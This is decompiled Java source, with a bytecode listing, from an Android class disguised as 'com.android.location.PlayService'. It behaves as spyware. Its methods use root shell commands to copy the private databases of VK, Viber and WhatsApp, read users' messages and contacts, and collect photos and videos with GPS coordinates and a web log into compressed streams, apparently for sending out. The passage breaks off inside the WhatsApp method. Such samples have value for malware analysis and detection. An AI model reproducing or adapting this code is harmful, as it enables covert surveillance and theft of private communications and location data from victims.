    //   2466: aload 14
    //   2468: astore 12
    //   2470: aload 11
    //   2472: astore 9
    //   2474: aload 10
    //   2476: astore 7
    //   2478: aload 11
    //   2480: astore 8
    //   2482: aload 10
    //   2484: astore 6
    //   2486: aload 13
    //   2488: arraylength
    //   2489: ifne +399 -> 2888
    //   2492: aload 14
    //   2494: astore 12
    //   2496: aload 11
    //   2498: astore 9
    //   2500: aload 10
    //   2502: astore 7
    //   2504: aload 11
    //   2506: astore 8
    //   2508: aload 10
    //   2510: astore 6
    //   2512: aload_0
    //   2513: aload_1
    //   2514: ldc_w 4416
    //   2517: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2520: aload 14
    //   2522: astore 12
    //   2524: aload 11
    //   2526: astore 9
    //   2528: aload 10
    //   2530: astore 7
    //   2532: aload 11
    //   2534: astore 8
    //   2536: aload 10
    //   2538: astore 6
    //   2540: aload_0
    //   2541: aload_1
    //   2542: ldc_w 571
    //   2545: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2548: aload 14
    //   2550: astore 12
    //   2552: aload 11
    //   2554: astore 9
    //   2556: aload 10
    //   2558: astore 7
    //   2560: aload 11
    //   2562: astore 8
    //   2564: aload 10
    //   2566: astore 6
    //   2568: aload_0
    //   2569: aload_1
    //   2570: ldc_w 571
    //   2573: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2576: aload 14
    //   2578: astore 12
    //   2580: aload 11
    //   2582: astore 9
    //   2584: aload 10
    //   2586: astore 7
    //   2588: aload 11
    //   2590: astore 8
    //   2592: aload 10
    //   2594: astore 6
    //   2596: aload_0
    //   2597: aload_1
    //   2598: ldc_w 571
    //   2601: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2604: iload_2
    //   2605: iconst_1
    //   2606: iadd
    //   2607: istore 4
    //   2609: aload 14
    //   2611: astore 12
    //   2613: aload 11
    //   2615: astore 9
    //   2617: aload 10
    //   2619: astore 7
    //   2621: aload 11
    //   2623: astore 8
    //   2625: aload 10
    //   2627: astore 6
    //   2629: aload_1
    //   2630: iconst_3
    //   2631: invokevirtual 2292	java/util/zip/GZIPOutputStream:write	(I)V
    //   2634: aload 14
    //   2636: astore 12
    //   2638: aload 11
    //   2640: astore 9
    //   2642: aload 10
    //   2644: astore 7
    //   2646: aload 11
    //   2648: astore 8
    //   2650: aload 10
    //   2652: astore 6
    //   2654: iload 5
    //   2656: i2l
    //   2657: putstatic 605	com/android/location/PlayService:lTGCounter	J
    //   2660: iload_3
    //   2661: iconst_1
    //   2662: iadd
    //   2663: istore_3
    //   2664: iload 4
    //   2666: sipush 200
    //   2669: if_icmple +263 -> 2932
    //   2672: aload 14
    //   2674: astore 12
    //   2676: aload 11
    //   2678: astore 9
    //   2680: aload 10
    //   2682: astore 7
    //   2684: aload 11
    //   2686: astore 8
    //   2688: aload 10
    //   2690: astore 6
    //   2692: aload_1
    //   2693: iconst_2
    //   2694: invokevirtual 2292	java/util/zip/GZIPOutputStream:write	(I)V
    //   2697: iload 4
    //   2699: istore_2
    //   2700: aload 14
    //   2702: astore 12
    //   2704: aload 11
    //   2706: astore 9
    //   2708: aload 10
    //   2710: astore 7
    //   2712: aload 11
    //   2714: astore 8
    //   2716: aload 10
    //   2718: astore 6
    //   2720: new 864	java/lang/StringBuilder
    //   2723: dup
    //   2724: ldc_w 4418
    //   2727: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   2730: iload_2
    //   2731: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   2734: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   2737: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2740: aload 14
    //   2742: astore 12
    //   2744: aload 11
    //   2746: astore 9
    //   2748: aload 10
    //   2750: astore 7
    //   2752: aload 11
    //   2754: astore 8
    //   2756: aload 10
    //   2758: astore 6
    //   2760: aload 14
    //   2762: invokeinterface 4421 1 0
    //   2767: ifne +30 -> 2797
    //   2770: aload 14
    //   2772: astore 12
    //   2774: aload 11
    //   2776: astore 9
    //   2778: aload 10
    //   2780: astore 7
    //   2782: aload 11
    //   2784: astore 8
    //   2786: aload 10
    //   2788: astore 6
    //   2790: aload 14
    //   2792: invokeinterface 1915 1 0
    //   2797: iload_2
    //   2798: istore_3
    //   2799: aload 14
    //   2801: astore 12
    //   2803: aload 11
    //   2805: astore 9
    //   2807: aload 10
    //   2809: astore 7
    //   2811: aload 11
    //   2813: astore 8
    //   2815: aload 10
    //   2817: astore 6
    //   2819: aload 15
    //   2821: invokevirtual 4387	android/database/sqlite/SQLiteDatabase:isOpen	()Z
    //   2824: ifeq -1700 -> 1124
    //   2827: aload 14
    //   2829: astore 12
    //   2831: aload 11
    //   2833: astore 9
    //   2835: aload 10
    //   2837: astore 7
    //   2839: aload 11
    //   2841: astore 8
    //   2843: aload 10
    //   2845: astore 6
    //   2847: aload 15
    //   2849: invokevirtual 4422	android/database/sqlite/SQLiteDatabase:close	()V
    //   2852: iload_2
    //   2853: istore_3
    //   2854: goto -1730 -> 1124
    //   2857: aload 14
    //   2859: astore 12
    //   2861: aload 11
    //   2863: astore 9
    //   2865: aload 10
    //   2867: astore 7
    //   2869: aload 11
    //   2871: astore 8
    //   2873: aload 10
    //   2875: astore 6
    //   2877: aload_0
    //   2878: aload_1
    //   2879: ldc_w 5510
    //   2882: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2885: goto -550 -> 2335
    //   2888: aload 14
    //   2890: astore 12
    //   2892: aload 11
    //   2894: astore 9
    //   2896: aload 10
    //   2898: astore 7
    //   2900: aload 11
    //   2902: astore 8
    //   2904: aload 10
    //   2906: astore 6
    //   2908: aload_0
    //   2909: aload_1
    //   2910: new 1306	java/lang/String
    //   2913: dup
    //   2914: aload_0
    //   2915: aload 13
    //   2917: invokespecial 5512	com/android/location/PlayService:clearTGKal	([B)[B
    //   2920: ldc_w 3218
    //   2923: invokespecial 4429	java/lang/String:<init>	([BLjava/lang/String;)V
    //   2926: invokevirtual 2186	com/android/location/PlayService:AddData	(Ljava/io/OutputStream;Ljava/lang/String;)V
    //   2929: goto -409 -> 2520
    //   2932: aload 14
    //   2934: astore 12
    //   2936: aload 11
    //   2938: astore 9
    //   2940: aload 10
    //   2942: astore 7
    //   2944: aload 11
    //   2946: astore 8
    //   2948: aload 10
    //   2950: astore 6
    //   2952: iload 4
    //   2954: istore_2
    //   2955: aload 14
    //   2957: invokeinterface 1914 1 0
    //   2962: ifne -887 -> 2075
    //   2965: goto -293 -> 2672
    //   2968: aload 14
    //   2970: astore 12
    //   2972: aload 11
    //   2974: astore 9
    //   2976: aload 10
    //   2978: astore 7
    //   2980: aload 11
    //   2982: astore 8
    //   2984: aload 10
    //   2986: astore 6
    //   2988: ldc_w 4431
    //   2991: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   2994: iload 5
    //   2996: istore_2
    //   2997: goto -257 -> 2740
    //   3000: astore_1
    //   3001: goto -2467 -> 534
    //   3004: astore_1
    //   3005: goto -2461 -> 544
    //   3008: astore_1
    //   3009: goto -1451 -> 1558
    //   3012: astore_1
    //   3013: goto -1445 -> 1568
    //   3016: astore 7
    //   3018: goto -1402 -> 1616
    //   3021: astore 6
    //   3023: goto -1397 -> 1626
    //   3026: astore_1
    //   3027: goto -1893 -> 1134
    //   3030: astore_1
    //   3031: goto -1887 -> 1144
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	3034	0	this	PlayService
    //   0	3034	1	paramGZIPOutputStream	GZIPOutputStream
    //   59	2938	2	i	int
    //   69	2785	3	j	int
    //   61	2892	4	k	int
    //   66	2929	5	m	int
    //   124	2863	6	localObject1	Object
    //   3021	1	6	localIOException1	IOException
    //   116	2863	7	localObject2	Object
    //   3016	1	7	localIOException2	IOException
    //   120	2863	8	localObject3	Object
    //   112	2863	9	localObject4	Object
    //   95	2890	10	localFileInputStream	FileInputStream
    //   104	2877	11	localFileOutputStream	FileOutputStream
    //   108	2863	12	localCursor1	Cursor
    //   98	2818	13	localObject5	Object
    //   71	2898	14	localCursor2	Cursor
    //   101	2747	15	localObject6	Object
    //   89	2214	16	localObject7	Object
    //   92	497	17	localObject8	Object
    //   195	1560	18	str1	String
    //   151	667	19	str2	String
    //   382	79	20	localFile	File
    // Exception table:
    //   from	to	target	type
    //   126	153	1494	java/lang/Exception
    //   173	197	1494	java/lang/Exception
    //   217	272	1494	java/lang/Exception
    //   292	327	1494	java/lang/Exception
    //   347	384	1494	java/lang/Exception
    //   404	412	1494	java/lang/Exception
    //   432	440	1494	java/lang/Exception
    //   460	470	1494	java/lang/Exception
    //   490	524	1494	java/lang/Exception
    //   566	572	1494	java/lang/Exception
    //   592	601	1494	java/lang/Exception
    //   621	631	1494	java/lang/Exception
    //   651	672	1494	java/lang/Exception
    //   692	713	1494	java/lang/Exception
    //   743	761	1494	java/lang/Exception
    //   781	788	1494	java/lang/Exception
    //   813	871	1494	java/lang/Exception
    //   891	913	1494	java/lang/Exception
    //   933	939	1494	java/lang/Exception
    //   959	981	1494	java/lang/Exception
    //   1001	1012	1494	java/lang/Exception
    //   1032	1040	1494	java/lang/Exception
    //   1060	1068	1494	java/lang/Exception
    //   1088	1098	1494	java/lang/Exception
    //   1118	1124	1494	java/lang/Exception
    //   1171	1182	1494	java/lang/Exception
    //   1206	1217	1494	java/lang/Exception
    //   1237	1243	1494	java/lang/Exception
    //   1263	1273	1494	java/lang/Exception
    //   1298	1320	1494	java/lang/Exception
    //   1340	1346	1494	java/lang/Exception
    //   1366	1391	1494	java/lang/Exception
    //   1411	1417	1494	java/lang/Exception
    //   1437	1442	1494	java/lang/Exception
    //   1462	1491	1494	java/lang/Exception
    //   1592	1598	1494	java/lang/Exception
    //   1648	1654	1494	java/lang/Exception
    //   1681	1687	1494	java/lang/Exception
    //   1710	1734	1494	java/lang/Exception
    //   1754	1763	1494	java/lang/Exception
    //   1783	1807	1494	java/lang/Exception
    //   1827	1835	1494	java/lang/Exception
    //   1855	1882	1494	java/lang/Exception
    //   1902	1907	1494	java/lang/Exception
    //   1927	1937	1494	java/lang/Exception
    //   1964	1990	1494	java/lang/Exception
    //   2010	2020	1494	java/lang/Exception
    //   2040	2046	1494	java/lang/Exception
    //   2066	2072	1494	java/lang/Exception
    //   2095	2114	1494	java/lang/Exception
    //   2134	2144	1494	java/lang/Exception
    //   2164	2174	1494	java/lang/Exception
    //   2194	2202	1494	java/lang/Exception
    //   2222	2241	1494	java/lang/Exception
    //   2266	2276	1494	java/lang/Exception
    //   2296	2302	1494	java/lang/Exception
    //   2328	2335	1494	java/lang/Exception
    //   2355	2380	1494	java/lang/Exception
    //   2400	2422	1494	java/lang/Exception
    //   2442	2461	1494	java/lang/Exception
    //   2486	2492	1494	java/lang/Exception
    //   2512	2520	1494	java/lang/Exception
    //   2540	2548	1494	java/lang/Exception
    //   2568	2576	1494	java/lang/Exception
    //   2596	2604	1494	java/lang/Exception
    //   2629	2634	1494	java/lang/Exception
    //   2654	2660	1494	java/lang/Exception
    //   2692	2697	1494	java/lang/Exception
    //   2720	2740	1494	java/lang/Exception
    //   2760	2770	1494	java/lang/Exception
    //   2790	2797	1494	java/lang/Exception
    //   2819	2827	1494	java/lang/Exception
    //   2847	2852	1494	java/lang/Exception
    //   2877	2885	1494	java/lang/Exception
    //   2908	2929	1494	java/lang/Exception
    //   2955	2965	1494	java/lang/Exception
    //   2988	2994	1494	java/lang/Exception
    //   126	153	1605	finally
    //   173	197	1605	finally
    //   217	272	1605	finally
    //   292	327	1605	finally
    //   347	384	1605	finally
    //   404	412	1605	finally
    //   432	440	1605	finally
    //   460	470	1605	finally
    //   490	524	1605	finally
    //   566	572	1605	finally
    //   592	601	1605	finally
    //   621	631	1605	finally
    //   651	672	1605	finally
    //   692	713	1605	finally
    //   743	761	1605	finally
    //   781	788	1605	finally
    //   813	871	1605	finally
    //   891	913	1605	finally
    //   933	939	1605	finally
    //   959	981	1605	finally
    //   1001	1012	1605	finally
    //   1032	1040	1605	finally
    //   1060	1068	1605	finally
    //   1088	1098	1605	finally
    //   1118	1124	1605	finally
    //   1171	1182	1605	finally
    //   1206	1217	1605	finally
    //   1237	1243	1605	finally
    //   1263	1273	1605	finally
    //   1298	1320	1605	finally
    //   1340	1346	1605	finally
    //   1366	1391	1605	finally
    //   1411	1417	1605	finally
    //   1437	1442	1605	finally
    //   1462	1491	1605	finally
    //   1503	1510	1605	finally
    //   1523	1533	1605	finally
    //   1541	1548	1605	finally
    //   1592	1598	1605	finally
    //   1648	1654	1605	finally
    //   1681	1687	1605	finally
    //   1710	1734	1605	finally
    //   1754	1763	1605	finally
    //   1783	1807	1605	finally
    //   1827	1835	1605	finally
    //   1855	1882	1605	finally
    //   1902	1907	1605	finally
    //   1927	1937	1605	finally
    //   1964	1990	1605	finally
    //   2010	2020	1605	finally
    //   2040	2046	1605	finally
    //   2066	2072	1605	finally
    //   2095	2114	1605	finally
    //   2134	2144	1605	finally
    //   2164	2174	1605	finally
    //   2194	2202	1605	finally
    //   2222	2241	1605	finally
    //   2266	2276	1605	finally
    //   2296	2302	1605	finally
    //   2328	2335	1605	finally
    //   2355	2380	1605	finally
    //   2400	2422	1605	finally
    //   2442	2461	1605	finally
    //   2486	2492	1605	finally
    //   2512	2520	1605	finally
    //   2540	2548	1605	finally
    //   2568	2576	1605	finally
    //   2596	2604	1605	finally
    //   2629	2634	1605	finally
    //   2654	2660	1605	finally
    //   2692	2697	1605	finally
    //   2720	2740	1605	finally
    //   2760	2770	1605	finally
    //   2790	2797	1605	finally
    //   2819	2827	1605	finally
    //   2847	2852	1605	finally
    //   2877	2885	1605	finally
    //   2908	2929	1605	finally
    //   2955	2965	1605	finally
    //   2988	2994	1605	finally
    //   529	534	3000	java/io/IOException
    //   539	544	3004	java/io/IOException
    //   1553	1558	3008	java/io/IOException
    //   1563	1568	3012	java/io/IOException
    //   1611	1616	3016	java/io/IOException
    //   1621	1626	3021	java/io/IOException
    //   1129	1134	3026	java/io/IOException
    //   1139	1144	3030	java/io/IOException
  }
  
  public long ReadUriImage(OutputStream paramOutputStream, Uri paramUri, long paramLong)
  {
    if (paramOutputStream == null) {
      return 0L;
    }
    FLOG("ReadIntImages()");
    paramUri = getContentResolver().query(paramUri, null, " _ID > " + paramLong, null, " _ID ASC");
    if (paramUri == null)
    {
      FLOG("ReadIntImages.query() failed");
      return 0L;
    }
    if (paramUri.moveToFirst()) {
      try
      {
        Object localObject = paramUri.getString(paramUri.getColumnIndex("_data"));
        FLOG("RP::file=" + (String)localObject);
        localObject = new File((String)localObject);
        if ((localObject == null) || (!((File)localObject).canRead()) || (!((File)localObject).isFile()))
        {
          FLOG("RP::cannot read file " + ((File)localObject).getName());
          return 0L;
        }
        int i = paramUri.getInt(paramUri.getColumnIndex("_id"));
        paramOutputStream.write(115);
        AddData(paramOutputStream, ((File)localObject).length());
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("_id")));
        AddData(paramOutputStream, paramUri.getLong(paramUri.getColumnIndex("date_added")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("latitude")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("longitude")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("_display_name")));
        WriteFileToOutputStream((File)localObject, paramOutputStream);
        paramOutputStream.write(1);
        paramOutputStream.write(3);
        paramOutputStream.write(2);
        return i;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "Cannot read picture file, except");
      }
    }
    return 0L;
  }
  
  public long ReadUriVideo(OutputStream paramOutputStream, Uri paramUri, long paramLong, int paramInt)
  {
    if (paramOutputStream == null) {
      return 0L;
    }
    FLOG("ReadUriVideo()");
    paramUri = getContentResolver().query(paramUri, null, " _ID > " + paramLong, null, " _ID ASC");
    if (paramUri == null)
    {
      FLOG("ReadVideos.query() failed");
      return 0L;
    }
    if (!paramUri.moveToFirst())
    {
      if (!paramUri.isClosed()) {
        paramUri.close();
      }
      FLOG("ReadVideos.query() - no records");
      return 0L;
    }
    try
    {
      Object localObject = paramUri.getString(paramUri.getColumnIndex("_data"));
      FLOG("RP::file=" + (String)localObject);
      localObject = new File((String)localObject);
      FLOG("]->1");
      int i = paramUri.getInt(paramUri.getColumnIndex("_id"));
      if ((localObject != null) && (((File)localObject).canRead()) && (((File)localObject).isFile()) && (((File)localObject).length() < 20971520L))
      {
        paramOutputStream.write(107);
        AddData(paramOutputStream, ((File)localObject).length());
        AddData(paramOutputStream, i);
        AddData(paramOutputStream, paramUri.getLong(paramUri.getColumnIndex("date_added")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("duration")));
        AddData(paramOutputStream, paramInt);
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("latitude")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("longitude")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("resolution")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("title")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("mime_type")));
        AddData(paramOutputStream, paramUri.getString(paramUri.getColumnIndex("_display_name")));
        WriteFileToOutputStream((File)localObject, paramOutputStream);
        paramOutputStream.write(1);
        paramOutputStream.write(3);
        paramOutputStream.write(2);
      }
      for (;;)
      {
        if (paramUri.isClosed()) {
          break label506;
        }
        paramUri.close();
        break label506;
        FLOG("Skip video, too big or cannot read");
        boolean bool = paramUri.moveToNext();
        if (bool) {
          break;
        }
      }
      return i;
    }
    catch (Exception paramOutputStream)
    {
      EXCEPT(paramOutputStream, "Cannot read video file, except");
      return 0L;
    }
  }
  
  public long ReadVK(GZIPOutputStream paramGZIPOutputStream)
  {
    FLOG("ReadVK ()last=" + lVKCounter);
    int i = 0;
    int m = 0;
    int j = 0;
    int k = 0;
    Object localObject1 = null;
    Object localObject2 = localObject1;
    Object localObject3;
    try
    {
      localObject3 = dataPath + "/databases/vk.db";
      localObject2 = localObject1;
      commandSU("cat " + "/data/data/com.vkontakte.android/databases/vk.db" + " > " + (String)localObject3);
      localObject2 = localObject1;
      commandSU("chmod 777 " + (String)localObject3);
      localObject2 = localObject1;
      localObject4 = new File((String)localObject3);
      localObject2 = localObject1;
      if (((File)localObject4).exists())
      {
        localObject2 = localObject1;
        if (((File)localObject4).canRead())
        {
          localObject2 = localObject1;
          if (((File)localObject4).length() != 0L) {
            break label193;
          }
        }
      }
      localObject2 = localObject1;
      FLOG("VK db not copied");
      break label896;
      label193:
      localObject2 = localObject1;
      localObject4 = SQLiteDatabase.openDatabase((String)localObject3, null, 1);
      localObject2 = localObject1;
      FLOG("Its open? " + ((SQLiteDatabase)localObject4).isOpen());
      localObject2 = localObject1;
      if (!((SQLiteDatabase)localObject4).isOpen()) {
        break label896;
      }
      localObject2 = localObject1;
      localObject3 = ((SQLiteDatabase)localObject4).rawQuery("SELECT mid,text,time, firstname||' '||lastname AS name ,photo_small,attachments FROM messages INNER join users ON sender = uid WHERE mid > " + lVKCounter + " ORDER BY mid", null);
      if (localObject3 == null) {
        break label880;
      }
      localObject2 = localObject3;
      FLOG("ReadVK.count = " + ((Cursor)localObject3).getCount());
      localObject2 = localObject3;
      if (((Cursor)localObject3).moveToFirst())
      {
        localObject2 = localObject3;
        FLOG("ReadVK > 0!");
        localObject2 = localObject3;
        paramGZIPOutputStream.write(97);
        i = k;
        localObject2 = localObject3;
        k = ((Cursor)localObject3).getInt(((Cursor)localObject3).getColumnIndex("mid"));
        localObject2 = localObject3;
        AddData(paramGZIPOutputStream, Integer.toString(k));
        localObject2 = localObject3;
        AddData(paramGZIPOutputStream, Integer.toString(8));
        localObject2 = localObject3;
        AddData(paramGZIPOutputStream, ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndex("photo_small")));
        localObject2 = localObject3;
        AddData(paramGZIPOutputStream, ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndex("name")));
        localObject2 = localObject3;
        AddData(paramGZIPOutputStream, Long.toString(((Cursor)localObject3).getLong(((Cursor)localObject3).getColumnIndex("time"))));
        localObject2 = localObject3;
        AddData(paramGZIPOutputStream, "");
        localObject2 = localObject3;
        AddData(paramGZIPOutputStream, ((Cursor)localObject3).getString(((Cursor)localObject3).getColumnIndex("text")));
        localObject2 = "";
        localObject1 = localObject2;
      }
    }
    catch (Exception paramGZIPOutputStream)
    {
      Object localObject4;
      label640:
      EXCEPT(paramGZIPOutputStream, "Error processing VK");
      if ((localObject2 != null) && (!((Cursor)localObject2).isClosed())) {
        ((Cursor)localObject2).close();
      }
      return -1L;
    }
    try
    {
      j = ((Cursor)localObject3).getColumnIndex("attachments");
      localObject1 = localObject2;
      FLOG("index = " + j);
      localObject1 = localObject2;
      if (((Cursor)localObject3).isNull(j)) {
        break label827;
      }
      localObject1 = localObject2;
      FLOG("VK reading link from att");
      localObject1 = localObject2;
      localObject2 = getLinkFromData(((Cursor)localObject3).getBlob(j));
      localObject1 = localObject2;
      FLOG("VK clear:" + (String)localObject2);
      localObject1 = localObject2;
    }
    catch (Exception localException)
    {
      localObject2 = localObject3;
      EXCEPT(localException, "vk attachments error link");
      break label640;
      i = j;
      localObject2 = localObject3;
    }
    localObject2 = localObject3;
    AddData(paramGZIPOutputStream, localObject1);
    localObject2 = localObject3;
    AddData(paramGZIPOutputStream, "");
    localObject2 = localObject3;
    AddData(paramGZIPOutputStream, "");
    j = i + 1;
    localObject2 = localObject3;
    paramGZIPOutputStream.write(3);
    localObject2 = localObject3;
    lVKCounter = k;
    if (j > 200)
    {
      label705:
      localObject2 = localObject3;
      paramGZIPOutputStream.write(2);
      i = j;
      localObject2 = localObject3;
      FLOG("red " + i);
    }
    for (;;)
    {
      localObject2 = localObject3;
      if (!((Cursor)localObject3).isClosed())
      {
        localObject2 = localObject3;
        ((Cursor)localObject3).close();
      }
      localObject2 = localObject3;
      j = i;
      if (!((SQLiteDatabase)localObject4).isOpen()) {
        break label896;
      }
      localObject2 = localObject3;
      ((SQLiteDatabase)localObject4).close();
      j = i;
      break label896;
      label827:
      localObject1 = localObject2;
      FLOG("VK att link is null");
      localObject1 = localObject2;
      break label640;
      if (((Cursor)localObject3).moveToNext()) {
        break;
      }
      break label705;
      label880:
      localObject2 = localObject3;
      FLOG("Failed to open");
      i = m;
    }
    label896:
    return j;
  }
  
  public long ReadViber(GZIPOutputStream paramGZIPOutputStream)
  {
    FLOG("ReadViber()last=" + lViberCounter);
    long l2 = 0L;
    Cursor localCursor2 = null;
    Cursor localCursor1 = localCursor2;
    long l1 = l2;
    try
    {
      if (sViberPath.length() == 0)
      {
        localCursor1 = localCursor2;
        l1 = l2;
        UpdateViberPath();
        localCursor1 = localCursor2;
        l1 = l2;
        SaveSettings();
      }
      localCursor1 = localCursor2;
      l1 = l2;
      if (sViberPath.length() == 0)
      {
        localCursor1 = localCursor2;
        l1 = l2;
        FLOG("Viber source path not found");
        return 0L;
      }
      localCursor1 = localCursor2;
      l1 = l2;
      localObject = dataPath + "/databases/viber_messages";
      localCursor1 = localCursor2;
      l1 = l2;
      commandSU("cat " + sViberPath + " > " + (String)localObject);
      localCursor1 = localCursor2;
      l1 = l2;
      commandSU("chmod 777 " + (String)localObject);
      localCursor1 = localCursor2;
      l1 = l2;
      File localFile = new File((String)localObject);
      localCursor1 = localCursor2;
      l1 = l2;
      if (localFile.exists())
      {
        localCursor1 = localCursor2;
        l1 = l2;
        if (localFile.canRead())
        {
          localCursor1 = localCursor2;
          l1 = l2;
          if (localFile.length() != 0L) {
            break label282;
          }
        }
      }
      localCursor1 = localCursor2;
      l1 = l2;
      FLOG("Viber db not copied");
      l3 = l2;
      break label886;
      label282:
      localCursor1 = localCursor2;
      l1 = l2;
      localObject = SQLiteDatabase.openDatabase((String)localObject, null, 1);
      localCursor1 = localCursor2;
      l1 = l2;
      FLOG("Its open? " + ((SQLiteDatabase)localObject).isOpen());
      localCursor1 = localCursor2;
      l1 = l2;
      l3 = l2;
      if (!((SQLiteDatabase)localObject).isOpen()) {
        break label886;
      }
      localCursor1 = localCursor2;
      l1 = l2;
      localCursor2 = ((SQLiteDatabase)localObject).query("messages", null, " _id > " + lViberCounter, null, null, null, " _id ASC ");
      if (localCursor2 == null) {
        break label870;
      }
      localCursor1 = localCursor2;
      l1 = l2;
      FLOG("ReadViber() " + localCursor2.getCount());
      l3 = l2;
      localCursor1 = localCursor2;
      l1 = l2;
      if (!localCursor2.moveToFirst()) {
        break label734;
      }
      localCursor1 = localCursor2;
      l1 = l2;
      FLOG("ReadViber > 0!");
      localCursor1 = localCursor2;
      l1 = l2;
      paramGZIPOutputStream.write(117);
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        Object localObject;
        EXCEPT(paramGZIPOutputStream, "Error processing viber ");
        l3 = l1;
        if (localCursor1 == null) {
          break;
        }
        l3 = l1;
        if (localCursor1.isClosed()) {
          break;
        }
        localCursor1.close();
        l3 = l1;
        break;
        l2 = l3;
        localCursor1 = localCursor2;
        l1 = l3;
        if (!localCursor2.moveToNext())
        {
          continue;
          localCursor1 = localCursor2;
          l1 = l2;
          FLOG("Failed to open");
        }
      }
    }
    localCursor1 = localCursor2;
    l1 = l2;
    AddData(paramGZIPOutputStream, localCursor2.getString(localCursor2.getColumnIndex("_id")));
    localCursor1 = localCursor2;
    l1 = l2;
    AddData(paramGZIPOutputStream, localCursor2.getString(localCursor2.getColumnIndex("address")));
    localCursor1 = localCursor2;
    l1 = l2;
    AddData(paramGZIPOutputStream, localCursor2.getString(localCursor2.getColumnIndex("type")));
    localCursor1 = localCursor2;
    l1 = l2;
    AddData(paramGZIPOutputStream, localCursor2.getLong(localCursor2.getColumnIndex("date")) / 1000L);
    localCursor1 = localCursor2;
    l1 = l2;
    AddData(paramGZIPOutputStream, localCursor2.getString(localCursor2.getColumnIndex("extra_mime")));
    localCursor1 = localCursor2;
    l1 = l2;
    AddData(paramGZIPOutputStream, localCursor2.getString(localCursor2.getColumnIndex("body")));
    long l3 = l2 + 1L;
    localCursor1 = localCursor2;
    l1 = l3;
    paramGZIPOutputStream.write(3);
    localCursor1 = localCursor2;
    l1 = l3;
    lViberCounter = localCursor2.getInt(localCursor2.getColumnIndex("_id"));
    if (l3 > 200L)
    {
      localCursor1 = localCursor2;
      l1 = l3;
      paramGZIPOutputStream.write(2);
      label734:
      localCursor1 = localCursor2;
      l1 = l3;
      FLOG("red " + l3);
      l2 = l3;
      localCursor1 = localCursor2;
      l1 = l2;
      l3 = l2;
      if (!((SQLiteDatabase)localObject).isOpen()) {
        break label886;
      }
      localCursor1 = localCursor2;
      l1 = l2;
      ((SQLiteDatabase)localObject).close();
      l3 = l2;
    }
    label870:
    label886:
    return l3;
  }
  
  public int ReadVideos(OutputStream paramOutputStream)
  {
    if (paramOutputStream == null) {
      return 0;
    }
    FLOG("ReadVideos() " + iLastIntVideoRed + "/" + iLastExtVideoRed);
    long l = ReadUriVideo(paramOutputStream, MediaStore.Video.Media.INTERNAL_CONTENT_URI, iLastIntVideoRed, 1);
    FLOG("iRes=" + l);
    if (l > 0L)
    {
      iLastIntVideoRed = l;
      return 1;
    }
    l = ReadUriVideo(paramOutputStream, MediaStore.Video.Media.EXTERNAL_CONTENT_URI, iLastExtVideoRed, 0);
    FLOG("eRes=" + l);
    if (l > 0L)
    {
      iLastExtVideoRed = l;
      return 1;
    }
    return 0;
  }
  
  public boolean ReadWEBLog(GZIPOutputStream paramGZIPOutputStream)
  {
    if (paramGZIPOutputStream == null) {
      return false;
    }
    FLOG("ReadWEBLog:try = " + sWEBLOG);
    if ((sWEBLOG == null) || (sWEBLOG.length() == 0)) {
      return true;
    }
    try
    {
      arrayOfString1 = sWEBLOG.split("\\[\\*\\]\\n");
      sWEBLOG = "";
      if (arrayOfString1.length <= 0) {
        break label106;
      }
      FLOG("ReadWEBLog:yes! = " + arrayOfString1.length);
      paramGZIPOutputStream.write(111);
      i = 0;
    }
    catch (Exception paramGZIPOutputStream)
    {
      for (;;)
      {
        String[] arrayOfString1;
        int i;
        label106:
        String[] arrayOfString2;
        EXCEPT(paramGZIPOutputStream, "ReadWEBLog");
        continue;
        AddData(paramGZIPOutputStream, arrayOfString2[0]);
        AddData(paramGZIPOutputStream, arrayOfString2[1]);
        paramGZIPOutputStream.write(3);
        i += 1;
      }
    }
    if (i >= arrayOfString1.length)
    {
      paramGZIPOutputStream.write(2);
      sWEBLOG = "";
      return true;
    }
    FLOG("L = " + arrayOfString1[i]);
    arrayOfString2 = arrayOfString1[i].split("\\<\\*\\>");
    if (arrayOfString2.length != 2)
    {
      FLOG("ReadWEBLog:ACHTUNG error field count!");
      return false;
    }
  }
  
  public long ReadWhatsApp(GZIPOutputStream paramGZIPOutputStream)
  {
    FLOG("ReadWhatsApp(), last=" + lWhatsAppCounter);
    long l2 = 0L;
    String str = null;
    Object localObject1 = str;
    long l1 = l2;
    try
    {
      if (sWhatsAppPath.length() == 0)
      {
        localObject1 = str;
        l1 = l2;
        UpdateWhatsAppPath();
        localObject1 = str;
        l1 = l2;
        SaveSettings();
      }
      localObject1 = str;
      l1 = l2;
      if (sWhatsAppPath.length() == 0)
      {
        localObject1 = str;
        l1 = l2;
        FLOG("Source WA path not found");
        return 0L;
      }
      localObject1 = str;
      l1 = l2;
      localObject2 = dataPath + "/databases/msgstore.db";
